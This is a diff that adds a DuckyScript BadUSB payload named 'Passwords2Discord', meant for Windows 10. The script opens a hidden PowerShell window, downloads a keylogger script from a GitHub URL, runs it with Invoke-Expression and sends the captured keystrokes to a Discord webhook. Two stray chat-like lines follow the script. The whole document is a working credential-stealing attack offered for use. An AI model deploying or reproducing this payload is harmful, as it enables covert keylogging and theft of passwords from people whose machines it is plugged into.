@@ -1,0 +1,16 @@
+REM Title: Passwords2Discord
+REM Author: Oscar R.C.
+REM Description: Sends a text file with the keylog of the computer
+REM Usage: Add your discord hook where it says ENTER_DISCORD_HOOK_HERE and edit the RunTime (in seconds) and TimesRun variable if you wish.
+REM Target: Windows 10
+
+GUI r
+DELAY 500
+STRING CMD
+ENTER
+DELAY 500
+STRING powershell.exe -windowstyle hidden -command "$hook='ENTER HOOK HERE';$RunTime=10;$TimesRun=1;Invoke-RestMethod https://raw.githubusercontent.com/Agente404/flipper/main/payloads/Keylogger2Discord/script.ps1 | Invoke-Expression;"
+ENTER
+
+The payload should be done by now....
+lets see....
